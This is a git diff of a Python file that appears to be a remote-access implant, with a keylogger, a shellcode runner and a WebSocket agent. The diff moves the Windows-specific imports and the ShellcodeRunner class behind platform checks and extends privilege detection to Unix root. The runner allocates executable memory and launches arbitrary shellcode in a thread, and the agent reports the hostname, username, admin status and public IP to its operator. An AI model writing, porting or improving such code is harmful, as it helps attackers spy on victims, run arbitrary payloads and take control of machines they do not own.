@@ -1,6 +1,7 @@
 import sys
 import subprocess
 import platform
+from datetime import datetime, timedelta
 
 def install_module(module_name, pip_name=None):
     """Helper function to install missing modules"""
@@ -68,8 +69,6 @@ try:
     from Crypto.Util.Padding import pad, unpad
     import requests
     import pyautogui
-    import winreg
-    from datetime import datetime, timedelta
     import shutil
     import ctypes
     import psutil
@@ -83,7 +82,10 @@ try:
     import websocket
     import tempfile
     import multiprocessing
-    from ctypes import wintypes
+    if platform.system() == 'Windows':
+       import winreg
+       from ctypes import wintypes
+    
     
     print("All modules imported successfully!")
 except ImportError as e:
@@ -1127,120 +1129,120 @@ class Keylogger:
 # ======================
 # Shellcode-Runner
 # ======================
+if platform.system() == 'Windows':
+    class ShellcodeRunner:
+        # Initialize Windows DLL
+        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+        
+        # Define Windows constants
+        MEM_COMMIT = 0x00001000
+        MEM_RESERVE = 0x00002000
+        PAGE_EXECUTE_READWRITE = 0x40
+        INFINITE = 0xFFFFFFFF
 
-class ShellcodeRunner:
-    # Initialize Windows DLL
-    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-    
-    # Define Windows constants
-    MEM_COMMIT = 0x00001000
-    MEM_RESERVE = 0x00002000
-    PAGE_EXECUTE_READWRITE = 0x40
-    INFINITE = 0xFFFFFFFF
+        # Set up proper function prototypes
+        kernel32.VirtualAlloc.restype = wintypes.LPVOID
+        kernel32.VirtualAlloc.argtypes = [
+            wintypes.LPVOID,    # lpAddress
+            ctypes.c_size_t,    # dwSize (using c_size_t instead of SIZE_T)
+            wintypes.DWORD,     # flAllocationType
+            wintypes.DWORD      # flProtect
+        ]
+        
+        kernel32.CreateThread.restype = wintypes.HANDLE
+        kernel32.CreateThread.argtypes = [
+            wintypes.LPVOID,    # lpThreadAttributes
+            ctypes.c_size_t,    # dwStackSize
+            wintypes.LPVOID,    # lpStartAddress
+            wintypes.LPVOID,    # lpParameter
+            wintypes.DWORD,     # dwCreationFlags
+            wintypes.LPDWORD    # lpThreadId
+        ]
+        
+        kernel32.WaitForSingleObject.restype = wintypes.DWORD
+        kernel32.WaitForSingleObject.argtypes = [
+            wintypes.HANDLE,    # hHandle
+            wintypes.DWORD      # dwMilliseconds
+        ]
 
-    # Set up proper function prototypes
-    kernel32.VirtualAlloc.restype = wintypes.LPVOID
-    kernel32.VirtualAlloc.argtypes = [
-        wintypes.LPVOID,    # lpAddress
-        ctypes.c_size_t,    # dwSize (using c_size_t instead of SIZE_T)
-        wintypes.DWORD,     # flAllocationType
-        wintypes.DWORD      # flProtect
-    ]
-    
-    kernel32.CreateThread.restype = wintypes.HANDLE
-    kernel32.CreateThread.argtypes = [
-        wintypes.LPVOID,    # lpThreadAttributes
-        ctypes.c_size_t,    # dwStackSize
-        wintypes.LPVOID,    # lpStartAddress
-        wintypes.LPVOID,    # lpParameter
-        wintypes.DWORD,     # dwCreationFlags
-        wintypes.LPDWORD    # lpThreadId
-    ]
-    
-    kernel32.WaitForSingleObject.restype = wintypes.DWORD
-    kernel32.WaitForSingleObject.argtypes = [
-        wintypes.HANDLE,    # hHandle
-        wintypes.DWORD      # dwMilliseconds
-    ]
+        @staticmethod
+        def _worker(shellcode_bytes):
+        
+            try:
+                # Allocate executable memory
+                ptr = ShellcodeRunner.kernel32.VirtualAlloc(
+                    None,
+                    len(shellcode_bytes),
+                    ShellcodeRunner.MEM_COMMIT | ShellcodeRunner.MEM_RESERVE,
+                    ShellcodeRunner.PAGE_EXECUTE_READWRITE
+                )
+                
+                if not ptr:
+                    raise ctypes.WinError(ctypes.get_last_error())
+                
+                # Copy shellcode to allocated memory
+                ctypes.memmove(ptr, shellcode_bytes, len(shellcode_bytes))
+                
+                # Create and execute thread
+                thread = ShellcodeRunner.kernel32.CreateThread(
+                    None,
+                    0,
+                    ptr,
+                    None,
+                    0,
+                    None
+                )
+                
+                if not thread:
+                    raise ctypes.WinError(ctypes.get_last_error())
+                
+                # Wait for thread to complete
+                ShellcodeRunner.kernel32.WaitForSingleObject(thread, ShellcodeRunner.INFINITE)
+                
+            except Exception as e:
+                print(f"Error in worker: {{e}}", file=sys.stderr)
+                sys.exit(1)
 
-    @staticmethod
-    def _worker(shellcode_bytes):
-       
-        try:
-            # Allocate executable memory
-            ptr = ShellcodeRunner.kernel32.VirtualAlloc(
-                None,
-                len(shellcode_bytes),
-                ShellcodeRunner.MEM_COMMIT | ShellcodeRunner.MEM_RESERVE,
-                ShellcodeRunner.PAGE_EXECUTE_READWRITE
-            )
-            
-            if not ptr:
-                raise ctypes.WinError(ctypes.get_last_error())
-            
-            # Copy shellcode to allocated memory
-            ctypes.memmove(ptr, shellcode_bytes, len(shellcode_bytes))
-            
-            # Create and execute thread
-            thread = ShellcodeRunner.kernel32.CreateThread(
-                None,
-                0,
-                ptr,
-                None,
-                0,
-                None
-            )
-            
-            if not thread:
-                raise ctypes.WinError(ctypes.get_last_error())
-            
-            # Wait for thread to complete
-            ShellcodeRunner.kernel32.WaitForSingleObject(thread, ShellcodeRunner.INFINITE)
-            
-        except Exception as e:
-            print(f"Error in worker: {{e}}", file=sys.stderr)
-            sys.exit(1)
-
-    @staticmethod
-    def execute(shellcode_bytes):
-        try:
-            # Direct execution in current process (more reliable in headless)
-            ptr = ShellcodeRunner.kernel32.VirtualAlloc(
-                None,
-                len(shellcode_bytes),
-                ShellcodeRunner.MEM_COMMIT | ShellcodeRunner.MEM_RESERVE,
-                ShellcodeRunner.PAGE_EXECUTE_READWRITE
-            )
-            
-            if not ptr:
-                raise ctypes.WinError(ctypes.get_last_error())
-            
-            ctypes.memmove(ptr, shellcode_bytes, len(shellcode_bytes))
-            
-            # Create thread with explicit stack size
-            thread = ShellcodeRunner.kernel32.CreateThread(
-                None,
-                0,  # Default stack size
-                ptr,
-                None,
-                0,  # Start immediately
-                None
-            )
-            
-            if not thread:
-                raise ctypes.WinError(ctypes.get_last_error())
-            
-            # Don't wait for completion in headless mode
-            return {{
-                'status': 'success',
-                'message': 'Shellcode executed asynchronously'
-            }}
-            
-        except Exception as e:
-            return {{
-                'status': 'error',
-                'message': str(e)
-            }}
+        @staticmethod
+        def execute(shellcode_bytes):
+            try:
+                # Direct execution in current process (more reliable in headless)
+                ptr = ShellcodeRunner.kernel32.VirtualAlloc(
+                    None,
+                    len(shellcode_bytes),
+                    ShellcodeRunner.MEM_COMMIT | ShellcodeRunner.MEM_RESERVE,
+                    ShellcodeRunner.PAGE_EXECUTE_READWRITE
+                )
+                
+                if not ptr:
+                    raise ctypes.WinError(ctypes.get_last_error())
+                
+                ctypes.memmove(ptr, shellcode_bytes, len(shellcode_bytes))
+                
+                # Create thread with explicit stack size
+                thread = ShellcodeRunner.kernel32.CreateThread(
+                    None,
+                    0,  # Default stack size
+                    ptr,
+                    None,
+                    0,  # Start immediately
+                    None
+                )
+                
+                if not thread:
+                    raise ctypes.WinError(ctypes.get_last_error())
+                
+                # Don't wait for completion in headless mode
+                return {{
+                    'status': 'success',
+                    'message': 'Shellcode executed asynchronously'
+                }}
+                
+            except Exception as e:
+                return {{
+                    'status': 'error',
+                    'message': str(e)
+                }}
 
 # ======================
 # WebSocket Client
@@ -1474,7 +1476,8 @@ class Agent:
             "hostname": platform.node(),
             "username": os.getlogin(),
             "os": platform.platform(),
-            "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
+            "privilege": "admin" if (platform.system() == 'Windows' and ctypes.windll.shell32.IsUserAnAdmin()) or (platform.system() != 'Windows' and os.getuid() == 0) 
+    else "user",
             "ip": requests.get('https://api.ipify.org', timeout=5).text,
             "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
         }}
